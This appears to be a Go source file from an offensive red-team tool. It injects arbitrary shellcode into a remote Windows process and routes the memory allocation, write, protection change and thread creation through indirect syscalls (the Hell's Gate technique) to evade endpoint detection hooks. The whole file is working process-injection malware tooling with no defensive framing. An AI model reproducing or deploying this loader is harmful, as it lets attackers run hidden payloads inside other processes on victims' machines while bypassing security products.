package main

import (
	"fmt"
	"unsafe"

	"github.com/scriptchildie/gohellsgate"

	"golang.org/x/sys/windows"
)

func ShellcodeInjectorSyscalls(pid uint32, sc []byte, rwx bool, verbose bool) error {
	var flProtect int

	const PROCESS_ALL_ACCESS = windows.STANDARD_RIGHTS_REQUIRED | windows.SYNCHRONIZE | 0xFFFF

	pHandle, err := windows.OpenProcess(uint32(PROCESS_ALL_ACCESS), false, uint32(pid))
	if err != nil {
		return fmt.Errorf("Failed to get a handle on process with pid: %d : %v", pid, err)
	}

	BaseAddress, err := NtAllocateVirtualMemorySyscall("NtAllocateVirtualMemory", uintptr(pHandle), uintptr(len(sc)), windows.MEM_COMMIT|windows.MEM_RESERVE, flProtect, verbose)
	if err != nil {
		return fmt.Errorf("NtAllocateVirtualMemorySyscall: Failed to allocate memory %v\n", err)
	}

	err = NtWriteVirtualMemory("NtWriteVirtualMemory", uintptr(pHandle), BaseAddress, sc, verbose)
	if err != nil {
		return fmt.Errorf("NtWriteVirtualMemory: Failed to write shellcode to memory %v\n", err)
	}

	if !rwx {
		if verbose {
			fmt.Println("[+] Changing Permissions to RX")
		}
		var oldProtect uint32

		err = NtProtectVirtualMemory("NtProtectVirtualMemory", uintptr(pHandle), BaseAddress, uintptr(len(sc)), uintptr(windows.PAGE_EXECUTE_READ), uintptr(unsafe.Pointer(&oldProtect)), true)
		if err != nil {
			return fmt.Errorf("NtProtectVirtualMemory Failed: %v", err)
		}
	}

	_, err = NtCreateThreadEx("NtCreateThreadEx", uintptr(pHandle), BaseAddress, verbose)
	if err != nil {
		return fmt.Errorf("NtCreateThreadEx: Failed to create remote thread %v\n", err)
	}

	return nil
}

func NtWriteVirtualMemory(ntapi string, handle, BaseAddress uintptr, shc []byte, verbose bool) error {
	/*
		NtWriteVirtualMemory(
		  IN

		  ProcessHandle, 					1
		  IN PVOID                BaseAddress,  					2
		  IN PVOID                Buffer,							3
		  IN ULONG                NumberOfBytesToWrite,				4
		  OUT PULONG              NumberOfBytesWritten OPTIONAL );  5
	*/
	var NumberOfBytesWritten uintptr

	NumberOfBytesToWrite := uintptr(len(shc))

	if verbose {
		fmt.Printf("[+] NtWriteVirtualMemory number of bytes to write: 0x%x\n", NumberOfBytesToWrite)
	}
	err1, err := gohellsgate.IndirectSyscall(
		ntapi,
		handle,                               //1
		uintptr(unsafe.Pointer(BaseAddress)), //2
		uintptr(unsafe.Pointer(&shc[0])),     //3
		NumberOfBytesToWrite,                 //4
		uintptr(unsafe.Pointer(&NumberOfBytesWritten)), //5
	)
	if err != nil {
		return fmt.Errorf("1 %s %x\n", err, err1)
	}
	if verbose {
		fmt.Printf("[+] NtWriteVirtualMemory number of bytes written: 0x%x\n", NumberOfBytesWritten)
	}

	return nil
}
